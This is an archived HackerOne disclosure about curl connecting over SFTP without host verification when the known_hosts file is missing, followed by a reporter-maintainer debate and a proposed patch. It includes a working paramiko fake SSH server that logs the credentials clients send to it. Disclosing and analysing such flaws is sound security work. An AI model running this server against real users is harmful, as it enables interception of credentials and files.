---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/improper-certificate-validation
  - env/web
substate: "not-applicable"
weakness: "Improper Certificate Validation"
enriched: true
body: true
date: 2025-02-05
submitted: 2025-01-27T17:30:02.608Z
bounty_usd: null
votes: 11
cve: []
program: "[[programs/curl|curl]]"
reporter: "nyymi"
source: "https://hackerone.com/reports/2961050"
title: "curl allows SSH connection even if host is not in known_hosts"
---
# curl allows SSH connection even if host is not in known_hosts

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 11 | **Program:** curl | **Disclosed:** 2025-02-05

- Report: [https://hackerone.com/reports/2961050](https://hackerone.com/reports/2961050)
- CWE: Improper Certificate Validation
- Submitted: 2025-01-27T17:30:02.608Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

## Summary:
Curl does _not_ fail if the SSH host identity cannot be verified due to the host not being included in the `.ssh/known_hosts` file. This makes using curl to login into an previously unknown ssh host system vulnerable to meddler in the middle attacks. When using key based authentication it will allow a malicious host to spoof the real system, and either return tampered or otherwise malicious content on download, or capture the uploads. When using username + password authentication it will also leak the username and password to the attacker, and thus allow the attacker to connect to the intended target host. 

Curl does have `--insecure` option which is said to:

```
              For SFTP and SCP, this option makes curl skip the known_hosts
              verification.  known_hosts is a file normally stored in the
              user's home directory in the ".ssh" subdirectory, which contains
              hostnames and their public keys.
```
From this it would be easy to assume that omitting `--insecure` would mean that the connection is secure, that is: the connection would fail if the host identity can't be verified *or* curl would prompt the user to verify the host key similar to how SSH command does. However, this is not the case, and the connection will succeed if the host is not in the `.ssh/known_hosts` file. The current curl behaviour is similar to ssh being used with `StrictHostKeyChecking` `accept-new`.

Note that while curl does warn of the issue with `Warning: Couldn't find a known_hosts file` this is too late:

```
$ curl --user foo sftp://localhost:2222
Enter host password for user 'foo':
Warning: Couldn't find a known_hosts file
curl: (67) Login denied
```
The warning is issued only after the password has been requested. The username & password have already been sent to the malicious server by the time the user sees the warning:
```
INFO:root:[pass] Authenticated username foo password bar
```
The warning also is quite useless when curl is being called from scripts as the command is not failing.

## Affected version
8.11.1

## Steps To Reproduce:
  1. `./configure --with-openssl --with-libssh` (or `--with-libssh2`)
  2. `make`
  3. Have no entry of targethost in `.ssh/known_hosts`file.
  4. `(DY)LD_LIBRARY_PATH=lib/.libs src/curl  sftp://foo:bar@targethost`

The middler in the middle will obtain the credentials:
```
INFO:root:[pass] Authenticated username foo password bar
```

## Supporting Material/References:

Here's a minimal fake SSH server dumping username & password sent to it. The server runs on port 2222.
```
#!/usr/bin/env python3

import paramiko.rsakey
import paramiko
import threading
import logging
import socket

logging.basicConfig(level = logging.INFO)

class SSHServer(paramiko.ServerInterface):
    def __init__(self):
        self.event = threading.Event()

    def get_allowed_auths(self, username):
        logging.debug('[auth] Get username {} allowed auths'.format(username))
        return "password,publickey,none"

    def check_auth_none(self, username):
        logging.debug('[none] Authenticated username {}'.format(username))
        return paramiko.AUTH_FAILED

    def check_auth_password(self, username, password):
        logging.info('[pass] Authenticated username {} password {}'.format(username, password))
        return paramiko.AUTH_FAILED

class ClientConnection(threading.Thread):
    def __init__(self, group = None, target = None, name = None, args = ()):
        threading.Thread.__init__(self, group = group, target = target, name = name)
        self.args = args

    def run(self):
        hostkey = self.args[0]
        client = self.args[1]
        transport = None
        chan = None

        try:
            transport = paramiko.Transport(client)
            try:
                transport.load_server_moduli()
            except:
                pass

            transport.add_server_key(hostkey)
            server = SSHServer()
            try:
                transport.start_server(server=server)
            except:
                logging.warning('*** SSH negotiation failed, disconnect')
                client.close()
                return

            logging.info('Full remote version: {}'.format(transport.remote_version))

            chan = transport.accept(10)
            if chan:
                chan.close()
            transport.close()

        except Exception as e:
            logging.info('*** Caught exception: {}: {}'.format(str(e.__class__), str(e)))
            if chan:
                chan.close()
            if transport:
                transport.close()
            pass


def main():
    hostkey = paramiko.rsakey.RSAKey.generate(1024)
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind(('', 2222))
    sock.listen(7)

    while True:
        client, addr = sock.accept()
        logging.info('Received connection from {}:{}'.format(addr[0], addr[1]))
        t = ClientConnection(args = (hostkey, client,))
        t.start()

if __name__ == '__main__':
    main()
```

  * [attachment / reference]

## Impact

## Summary:
- Download of malicious content (on download).
- Leak of confidential information (on upload).
- Leak of credentials (if using password auth).

## Timeline

- **Report Filed**
- **Report Vulnerability Information Updated**
- **2025-01-27** @nyymi: Update: This issue seems to happen only if known_host file is missing and curl command can't find it at: https://github.com/curl/curl/blob/cb4cd36fe7183b2f289b40be6e38c1442925ab18/src/tool_operate.c#L1168

More correct title would be:
`curl allows SSH connection to unverified host if known_hosts file is missing.`

This step 3 in the *Steps To Reproduce* should be:
3. Have no `.ssh/known_hosts` file present.

*Proposed Fix*
- Make curl command return an error if it cannot locate `.ssh/known_hosts` or if `CURLOPT_SSH_KNOWNHOSTS` returns `CURLE_UNKNOWN_OPTION`.
- **2025-01-27** @bagder: Thank you for your report!

We will take some time and investigate your reports and get back to you with details and possible follow-up questions as soon as we can! Most likely within the next 24 hours.

We always strive to fix reported problems as fast as possible. Issues with severity Low or Medium we merge into the next release in the ordinary release cycle. Only for more serious problems we might  release fix early.
- **2025-01-27** @nyymi: It's easy to see how this wasn't noticed earlier: Most test environments actually do have a `.ssh/known_hosts` file - and when present it masks the issue. Only if the file is not there will the vulnerability get triggered. I can see this affecting for example docker or similar automation systems where the environment is created with minimal user "home".
- **2025-01-27** @nyymi: Since I misidentified the issue originally, the "Curl does not fail if the SSH host identity cannot be verified due to the host not being included in the `.ssh/known_hosts` file" should rather be "Curl does not fail if the SSH host identity cannot be verified due to the `.ssh/known_hosts` file not existing". Much of the rest is kind of okay, except maybe curl more behaving as ssh`StrictHostKeyChecking` `no` in this situation.
- **2025-01-27** @nyymi: One consideration about fixing this is that if it is changed to fail if the file is missing, it likely will cause many automated systems to fail. However, these systems are also vulnerable to meddler in the middle attacks, so I believe it is quite appropriate.
- **2025-01-27** @bagder: I don't think this is a security vulnerability.

It is as pointed generally a bad default behavior we should fix, but it does warn about it so users are aware and I see no documentation stating that it would behave differently (the --insecure docs is too vague and talks about disabling the option, not what to expect by default). I don't think users were tricked to expect anything else than what happens.
- **2025-01-27** @dfandrich: You could look at the existence of `known_hosts` as the signal to enable known hosts checking. It may not be as explicit as an option, but it does make  sense and in the absence of documentation saying otherwise, it seems to me a reasonable thing to document as WAI.
- **2025-01-27** @nyymi: >  I don't think users were tricked to expect anything else than what happens.

I disagree strongly. It is reasonable to expect consistent behaviour the file missing vs it existing. I think it very much is a vulnerability. My reasoning:

a) curl command works different when the file is missing and when it exists. If the file (even an empty one) exists the unknown host will be rejected (expectation). If the file doesn't exist, curl will happily connect to any host, enabling meddler in the middle attacks, leading to loss of confidentiality and integrity. This is wildly unexpected behaviour and quite clear breach of "principle of least astonishment".

b) The libcurl code explicitly returns an errors in known_hosts validation *even if the file is missing*. This is clearly the intended behaviour. See
https://github.com/curl/curl/blob/81e271f45cad561e8c39f5beeb317b0c7079f4b6/lib/vssh/libssh.c#L455
```
    case SSH_SERVER_FILE_NOT_FOUND:
    case SSH_SERVER_NOT_KNOWN:
      keymatch = CURLKHMATCH_MISSING;
      break;
```

This will make it fail if no callback changes it: https://github.com/curl/curl/blob/81e271f45cad561e8c39f5beeb317b0c7079f4b6/lib/vssh/libssh.c#L526
```
      if(keymatch != CURLKHMATCH_OK) {
        rc = SSH_ERROR;
        goto cleanup;
      }
```
So the correct code in libcurl is present, but curl fails to use it. I find it a stretch to argue that curl behaving like it does wouldn't have a security impact (since it clearly does).

If you can argue otherwise I would very much like to hear the justification(s).
- **2025-01-27** @nyymi: > You could look at the existence of known_hosts as the signal to enable known hosts checking.

All other SSH tooling  I know of (OpenSSH, Putty, WinSCP, probably many more) behave differently in regarding the missing `.ssh/known_hosts` file.  While curl isn't one of those apps, if everyone else behaves one way, why should curl be an exception? Safe and consistent behaviour is something that users should expect. libcurl *itself* behaves different to curl.

Curl is supposed to be "secure by default" unless if told to be insecure by passing `--insecure`.
- **2025-01-27** @nyymi: Let me give you an analogy:

Imagine you had a similar issue in how TLS certificate stores are handled. If the certificate store file did not exist, the remote host would be accepted.

Hence this would just work:
`curl --cacert /some/path/nonexistent.crt https://untrusted-root.badssl.com/`

Would this not be a vulnerability?

Oh yes, curl does the expected & right thing here and fails:
```
curl: (77) Problem with the SSL CA cert (path? access rights?)
```
I argue that curl should do the same for known_hosts.That is: Fail the connection as insecure if the file is missing (unless if `--insecure` is specified).
- **2025-01-27** @dfandrich: That `--cacert` example explicitly specifies a file; I don't consider that analogous.
- **2025-01-27** @nyymi: > That --cacert example explicitly specifies a file; I don't consider that analogous.

Imagine that the system default CA file is missing (unlikely, but for whatever reason). Curl doesn't turn insecure in this case, but fails the host validation and hence the connection.

Just like missing .ssh/known_hosts should.
- **2025-01-27** @dfandrich: The difference is a consequence of the differing models in establishing a root of trust between ssh and HTTPS servers: there is no central authority signing SSH keys and (in the vast majority of environments) the first connection to an SSH hosts is done without it being in the `known_hosts` file (and the very first connection without the file existing at all). It's normal and expected and when that file isn't there, there's simply nothing a priori to verify. I'm not saying we shouldn't add a way to fail host checking when the file doesn't exist, but just that it's not the same as making `--insecure` the default.
- **2025-01-27** @nyymi: > The difference is a consequence of the differing models in establishing a root of trust between ssh and HTTPS servers: there is no central authority signing SSH keys and (in the vast majority of environments) the first connection to an SSH hosts is done without it being in the known_hosts file (and the very first connection without the file existing at all). It's normal and expected and when that file isn't there, there's simply nothing a priori to verify

Well there has been RFC4255 `SSHFP` DNS record for ages now, so curl really ought to add support for that. Especially now that curl is doing other DNS magic as well. However, this is beside the point really.

My argument is that the current curl behaves in an unexpected way that results in a serious vulnerablity with real-world security impact.

*) https://datatracker.ietf.org/doc/html/rfc4255
- **2025-01-28** @dfandrich: If an application is expecting curl to check host keys but it doesn't supply curl with any host keys to check, that's an installation  issue. It's not curl's job to tell users about installation issues, at least as long as it doesn't promise it will. But adding such a feature, along with adding SSHFP, sound like great feature requests.
- **2025-01-28** @nyymi: The official curl docker image is vulnerable:

`docker run --rm curlimages/curl:8.11.1 sftp://foo:bar@whatever.invalid`

Anyone in a privileged network position can intercept the username, password and tamper with the content downloaded/uploaded. This is a serious security vulnerability.
- **2025-01-28** @dfandrich: A user using the dockerized curl should be mapping a `known_hosts` file into the container or using the `--hostpubmd5` or `--hostpubsha256` options to get host key checking.
- **2025-01-28** @nyymi: > A user using the dockerized curl should be mapping a known_hosts file into the container or using the --hostpubmd5 or --hostpubsha256 options to get host key checking.

Yes, they should. Curl should *also* throw an error instead of insecure operation if such configuration is not in place.

Curl not doing this, and the current behaviour bring undocumented is a serious vulnerability that is currently affecting untold number of systems. Curl should help the user so that they know how to do things securely. Curl having default insecure behaviour and documentation being lacking are not conductive to having secure configurations.
- **2025-01-28** @nyymi: Speaking of: `--hostpubsha256` is quietly ignored if curl is built against libssh. IMHO this should throw an error, rather than being quietly ignored. This limitation is at least documented, but throwing an error would be safer as then the user would notice their mistake. If error is out of the question a warning would be better than nothing.
- **2025-01-28** @bagder: We can all agree that curl can do better here, but I still cannot agree to this being a **vulnerability**. It's how it works, and how it has worked for a long time and for this missing hosts file it warns about it. There is no documentation claiming the opposite.

I'm sure we can improve.
- **2025-01-29** @nyymi: Just because curl has been vulnerable like this for a long time justifying this is a poor argument in my opinion.

I still consider this a vulnerability due to the undocumented, unexpected behaviour of curl here. Any documentation that exists hints at curl working in a secure manner, but it does not.

This is especially dangerous as libcurl itself is secure and works in a different manner (if the file is missing, it will fail the connection).

It of course is curl project prerogative to close this as not a vulnerability, but I respectfully disagree.
- **2025-01-30** @nyymi: > it does warn about it so users are aware

I'd like to understand why you think that the warning message given to the user is enough of a protection against leaking confidential information to the attacker.

Say you do this:
```
$ echo "mah secrets" > secrets.txt
$ curl -T secrets.txt --user bob:hunter2 sftp://target.invalid/tmp/
```

The user will get a warning `Warning: Couldn't find a known_hosts file`, but within milliseconds:
- Username and password is leaked to the attacker
- The sent file (`"mah secrets\n"`) is leaked to the attacker
- **2025-01-30** @dfandrich: So, the user doesn't provide a SHA-256 hash, doesn't provide an MD5 hash, doesn't provide a known_hosts file, yet still wants to send a secret file to an unauthenticated  host? Doesn't sounds like that user is very concerned with security in the first place.
- **2025-01-30** @nyymi: > the user doesn't provide a SHA-256 hash, doesn't provide an MD5 hash, doesn't provide a known_hosts file, yet still wants to send a secret file to an unauthenticated host?

The user not passing `--insecure`. It is a fair to assume that curl would not connect insecurely in this case. The user is using a protocol that is documented to be *secure by default*. Again, let me reiterate what `--insecure` says:

*(TLS  SFTP SCP) By default, every secure connection curl makes is verified to be secure before the transfer takes place.*

Unfortunately this is not true.
- **2025-02-04** @nyymi: I am currently writing an advisory about this, and I intend to present the curl project position fairly, too. Here's the relevant part (so far):

> It should be noted that curl project itself doesn't consider this issue a security
vulnerability. The project argues that the "Warning: Couldn't find a known_hosts file" message shown should be enough to alert the user to the issue. Additionally the project argues that the the documentation does not explicitly state that the operation would be safe if the known_hosts file is missing. The argument also is that the user should understand that the connection would be insecure under these circumstances. Finally, the project also mentions that this is the way curl has worked for a long time.

Does this accurately represent your position?
- **2025-02-05** @bagder: Seems accurate, yes. If I would write it, I would also mention that this an area/behavior that could be improved in curl.
- **2025-02-05** @nyymi: > Seems accurate, yes. If I would write it, I would also mention that this an area/behavior that could be improved in curl.

Ok will add it.
- **Report Not Applicable**
- **2025-02-05** @nyymi: This is the patch I will recommend in my advisory:
```
diff --git a/src/tool_operate.c b/src/tool_operate.c
index 007a5e054..52e10a5f5 100644
--- a/src/tool_operate.c
+++ b/src/tool_operate.c
@@ -1170,14 +1170,13 @@ static CURLcode config2setopts(struct GlobalConfig *global,
         /* new in curl 7.19.6 */
         result = res_setopt_str(curl, CURLOPT_SSH_KNOWNHOSTS, known);
         curl_free(known);
-        if(result == CURLE_UNKNOWN_OPTION)
-          /* libssh2 version older than 1.1.1 */
-          result = CURLE_OK;
-        if(result)
-          return result;
       }
-      else
+      else {
         warnf(global, "Couldn't find a known_hosts file");
+        result = res_setopt_str(curl, CURLOPT_SSH_KNOWNHOSTS, "");
+      }
+      if(result)
+        return result;
     }
   }

```
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
